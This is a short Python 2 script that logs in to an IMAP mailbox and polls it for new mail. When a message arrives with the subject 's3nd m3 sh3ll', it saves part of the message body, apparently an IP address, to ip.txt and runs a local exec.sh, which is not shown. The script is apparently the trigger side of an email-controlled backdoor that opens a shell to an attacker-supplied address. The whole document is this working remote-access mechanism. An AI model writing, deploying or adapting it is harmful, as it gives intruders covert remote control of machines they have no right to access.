#!/usr/local/bin/python


##Hello there
from subprocess import call
import imaplib
import email
import os
import time
import getpass

myIMAP = raw_input("Please enter IMAP server: ")
myUSER = raw_input("Please enter your Email: ")
myPASS = getpass.getpass(prompt="Please enter your password: ")

mail = imaplib.IMAP4_SSL(myIMAP)
mail.login(myUSER, myPASS)
mail.list()
mail.select("inbox")

while 1:
	os.system('clear')
	print '\033[1;33mSearching for Email....\033[1;m'
	result, data = mail.search(None, "ALL")

	ids = data[0]
	id_list = ids.split()
	latest_email = id_list[-1]

	result, data = mail.fetch(latest_email, "(RFC822)")
	raw = data[0][1]
	result, data = mail.uid('search', None, "ALL")
	latest_email = data[0].split()[-1]
	result, data = mail.uid('fetch', latest_email, '(RFC822)')
	raw = data[0][1]
	raw_email = raw.decode('utf-8')

	email_message = email.message_from_string(raw_email)
	
	mysubj = email_message['Subject']
	
	if email_message.is_multipart():
		for payload in email_message.get_payload():
			data = payload.get_payload()
			clean = data[15:][:-12]
	
		if mysubj == "s3nd m3 sh3ll":
			print '\033[1;31mFound Email :-)\033[1;m'
			f=open ("ip.txt", "w")
			me = f.write(clean)
			f.close()
			call(["./exec.sh"])
			break
